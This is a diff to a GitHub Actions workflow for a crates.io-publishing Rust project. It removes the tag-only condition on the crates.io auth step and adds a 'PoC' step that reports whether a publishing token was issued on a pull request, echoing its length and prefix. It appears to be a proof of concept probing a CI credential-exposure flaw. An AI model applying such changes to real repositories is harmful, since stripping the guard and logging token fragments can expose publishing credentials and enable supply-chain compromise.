@@ -54,9 +54,23 @@ jobs:
       - name: Publish (dry run)
         run: cargo ws publish --publish-as-is --dry-run
 
+      # MODIFIED: Removed the 'if' condition so it runs on your PR
       - uses: rust-lang/crates-io-auth-action@v1
-        if: startsWith(github.event.ref, 'refs/tags')
         id: auth
+
+      # NEW: Proof of Concept step to verify token access
+      - name: "PoC: Check OIDC Token Access"
+        run: |
+          if [ -n "${{ steps.auth.outputs.token }}" ]; then
+            TOKEN_VAL="${{ steps.auth.outputs.token }}"
+            echo "STATUS: VULNERABLE"
+            echo "PoC: OIDC Token was successfully generated for this PR."
+            echo "PoC: Token length is ${#TOKEN_VAL} characters."
+            echo "PoC: Token prefix: ${TOKEN_VAL:0:5}..."
+          else
+            echo "STATUS: SECURE"
+            echo "PoC: Token is empty or was not generated."
+          fi
 
       - name: publish to crates.io if tagged
         if: startsWith(github.event.ref, 'refs/tags')
